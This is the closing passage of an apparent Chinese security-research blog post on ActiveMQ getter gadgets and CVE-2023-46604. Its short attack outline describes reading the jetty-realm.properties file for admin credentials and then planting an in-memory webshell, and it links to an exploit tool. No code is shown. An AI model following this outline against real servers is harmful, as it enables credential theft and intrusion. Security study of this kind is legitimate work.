+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927174321474.png" srcset="/img/loading.gif" lazyload alt="image-20240927174321474"></p>
+<p>嗯嗯，就这样</p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>先通过有回显exp读取<code>conf/jetty-realm.properties</code>文件，找到admin的账户密码</p>
+<p>能够登陆后就可以打入内存马</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2024/09/25/ActiveMQ-CVE-2023-46604-%E4%B8%8D%E5%87%BA%E7%BD%91RCE/">ActiveMQ CVE-2023-46604 不出网RCE | Bmth’s blog (bmth666.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Arlenhiack/ActiveMQ-RCE-Exploit/tree/main">Arlenhiack&#x2F;ActiveMQ-RCE-Exploit: ActiveMQ RCE (CVE-2023-46604) 回显利用工具 (github.com)</a></p>
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>有点绕，好乱</p>
+<p>如果可以通过socket进行回显，那么为什么还要把他弄为xml文件，既然都是xml那就是要出网的</p>
+<p>还有内存马如果不出网的话咋加载xml呢</p>
+<p>？不太理解</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ActiveMQ依赖存在的getter</div>
+      <div>https://zer0peach.github.io/2024/09/27/ActiveMQ依赖存在的getter/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/09/25/ByteCTF2024-web/" title="ByteCTF2024-web">
+                        <span class="hidden-mobile">ByteCTF2024-web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
